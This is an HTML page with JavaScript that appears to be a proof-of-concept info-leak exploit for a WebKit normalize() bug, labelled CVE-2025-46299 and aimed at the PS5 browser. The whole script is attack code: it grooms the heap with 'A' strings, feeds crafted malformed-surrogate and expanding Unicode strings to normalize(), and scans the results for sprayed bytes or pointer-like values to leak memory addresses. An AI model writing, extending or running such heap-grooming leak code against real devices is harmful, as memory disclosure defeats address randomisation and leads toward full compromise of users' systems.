<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CVE-2025-46299 - Heap Grooming Info Leak</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting CVE-2025-46299 Heap Grooming Info Leak test...');

// Step 1: Groom the heap with a known pattern (0x4141 = 'A')
// We want these allocations to land in the same IsoHeap bucket as StringImpl.
// StringImpl size for a 20-char string is around 40-50 bytes.
L('[*] Grooming heap with 0x4141 pattern...');
let spray = [];
for (let i = 0; i < 100000; i++) {
    // Create strings of exactly 20 chars (40 bytes) to match the target allocation
    spray.push("AAAAAAAAAAAAAAAAAAAA"); // 20 'A's
}
spray = null; // Let GC claim them, leaving 0x41414141 in freed memory

// Step 2: Trigger the normalize bug
// We need a string that expands, but ICU fails on the second pass.
// The Hermes report said ICU might fail or underwrite.
// Let's try strings that are valid for the first pass (length calculation)
// but might fail or truncate on the second pass (actual writing).

L('[*] Triggering normalize() with edge cases...');

const testStrings = [
    // Strings with bad surrogates mixed with expanders
    'A\uD800\uFDFA',
    '\uFB01\uDC00\uFB03',
    '\u212B\uD800\uFDFA',
    
    // Long strings with a single bad surrogate at the end
    '\uFDFA'.repeat(100) + '\uD800',
    '\uFB03'.repeat(100) + '\uDC00',
    
    // Strings that might cause ICU buffer overflow on second pass
    '\uFDFA'.repeat(1000),
    
    // Rapidly switching between valid and invalid
    '\uFDFA\uD800\uFDFA\uD800\uFDFA\uD800',
];

let realLeakFound = false;

for (const str of testStrings) {
    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
        try {
            let res = str.normalize(form);
            
            // Check if the result contains our 0x4141 ('A') pattern in a place it shouldn't
            // We are looking for 'A' (0x41) in the middle of Arabic/CJK expansions
            // Or we are looking for a length that is way off
            
            // Convert to hex for analysis
            let hex = [];
            for (let i = 0; i < res.length; i++) {
                hex.push(res.charCodeAt(i).toString(16).padStart(4, '0'));
            }
            let hexStr = hex.join(' ');
            
            // If we see a sequence of 0x4141 0x4141 0x4141 (our spray), that's a leak
            if (hexStr.includes('4141 4141 4141')) {
                L('[!] REAL LEAK DETECTED!');
                L('    Input: ' + str.substring(0, 20));
                L('    Form: ' + form);
                L('    Length: ' + res.length);
                L('    Hex: ' + hexStr.substring(0, 200) + '...');
                realLeakFound = true;
                break;
            }
            
            // Also check for other obvious pointer patterns (0x7fxx or 0x0000)
            // Pointers in x64 often look like 0x00007f... which as UChars is 0000 7fxx
            if (hexStr.includes('0000 7f') || hexStr.includes('7f') && hexStr.includes('0000')) {
                // Be careful not to trigger on valid Unicode that happens to have 7f
                // But 0x7f is DELETE control char, rare in normal text
                if (hexStr.match(/0000 7f[0-9a-f]{2}/)) {
                    L('[!] POSSIBLE POINTER LEAK DETECTED!');
                    L('    Input: ' + str.substring(0, 20));
                    L('    Form: ' + form);
                    L('    Hex: ' + hexStr.substring(0, 200) + '...');
                    realLeakFound = true;
                    break;
                }
            }
            
        } catch (e) {
            // Ignore exceptions
        }
    }
    if (realLeakFound) break;
}

if (!realLeakFound) {
    L('[*] No leak detected with 0x4141 pattern.');
    L('[*] The bug may require a different heap layout or a different ICU trigger.');
} else {
    L('[+] LEAK CONFIRMED! We can now read memory addresses.');
}

L('[*] Test finished.');
</script>
</body>
</html>
